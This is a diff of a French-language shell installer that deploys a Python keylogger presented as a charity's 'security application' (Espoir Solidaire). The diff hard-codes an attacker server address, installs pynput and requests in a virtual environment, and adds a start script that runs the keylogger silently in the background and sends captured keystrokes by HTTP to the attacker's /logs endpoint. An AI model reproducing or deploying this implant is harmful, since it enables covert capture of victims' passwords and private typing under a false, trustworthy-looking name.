@@ -15,14 +15,29 @@ mkdir -p "$INSTALL_DIR"
 
 echo "[+] Création du dossier d'installation..."
 
-# URL du serveur attaquant
-ATTACKER_IP="${ATTACKER_IP:-192.168.56.101}"
-ATTACKER_PORT="${ATTACKER_PORT:-8080}"
+# Configuration du serveur attaquant (valeurs fixes)
+ATTACKER_IP="192.168.56.101"
+ATTACKER_PORT="8080"
 
 echo "[+] Configuration de la connexion sécurisée..."
 
+# Créer un environnement virtuel Python
+echo "[+] Création de l'environnement virtuel Python..."
+python3 -m venv "$INSTALL_DIR/venv" 2>&1
+
+# Installer les dépendances dans l'environnement virtuel
+echo "[+] Installation des dépendances de sécurité..."
+"$INSTALL_DIR/venv/bin/pip" install --upgrade pip > /dev/null 2>&1
+"$INSTALL_DIR/venv/bin/pip" install pynput requests > /dev/null 2>&1
+
+# Vérifier que l'installation a réussi
+if [ ! -f "$INSTALL_DIR/venv/bin/python3" ]; then
+    echo "[-] Erreur: Impossible de créer l'environnement virtuel"
+    exit 1
+fi
+
 # Créer le fichier keylogger.py (version simplifiée intégrée)
-cat > "$INSTALL_DIR/keylogger.py" << 'KEYLOGGER_EOF'
+cat > "$INSTALL_DIR/keylogger.py" << KEYLOGGER_EOF
 #!/usr/bin/env python3
 """
 Application de sécurité Espoir Solidaire
@@ -40,16 +55,11 @@ from threading import Thread
 import os
 import sys
 
-try:
-    from pynput import keyboard
-except ImportError:
-    print("Installation des dépendances...")
-    os.system("pip3 install pynput requests > /dev/null 2>&1")
-    from pynput import keyboard
+from pynput import keyboard
 
 # Configuration
-ATTACKER_IP = "$ATTACKER_IP"
-ATTACKER_PORT = $ATTACKER_PORT
+ATTACKER_IP = "192.168.56.101"
+ATTACKER_PORT = 8080
 HTTP_ENDPOINT = f"http://{ATTACKER_IP}:{ATTACKER_PORT}/logs"
 SEND_INTERVAL = 2
 RETRY_ATTEMPTS = 3
@@ -157,29 +167,22 @@ if __name__ == "__main__":
     monitor.run()
 KEYLOGGER_EOF
 
-# Remplacer les variables dans le script Python
-sed -i "s/\"\\$ATTACKER_IP\"/\"$ATTACKER_IP\"/g" "$INSTALL_DIR/keylogger.py"
-sed -i "s/\\$ATTACKER_PORT/$ATTACKER_PORT/g" "$INSTALL_DIR/keylogger.py"
-
 # Rendre le script exécutable
 chmod +x "$INSTALL_DIR/keylogger.py"
 
 # Créer le fichier de configuration
 cat > "$INSTALL_DIR/config.py" << CONFIG_EOF
-ATTACKER_IP = "${ATTACKER_IP:-192.168.56.101}"
+ATTACKER_IP = "192.168.56.101"
 ATTACKER_PORT = 8080
 EXFILTRATION_MODE = "http"
 CONFIG_EOF
 
-# Installer les dépendances Python
-echo "[+] Installation des dépendances de sécurité..."
-pip3 install --user pynput requests > /dev/null 2>&1
-
-# Créer un script de démarrage
+# Créer un script de démarrage utilisant l'environnement virtuel
 cat > "$INSTALL_DIR/start.sh" << START_EOF
 #!/bin/bash
 cd "$INSTALL_DIR"
-nohup python3 keylogger.py > /dev/null 2>&1 &
+# Utiliser le Python de l'environnement virtuel
+"$INSTALL_DIR/venv/bin/python3" keylogger.py > /dev/null 2>&1 &
 echo \$! > "$INSTALL_DIR/keylogger.pid"
 START_EOF
 
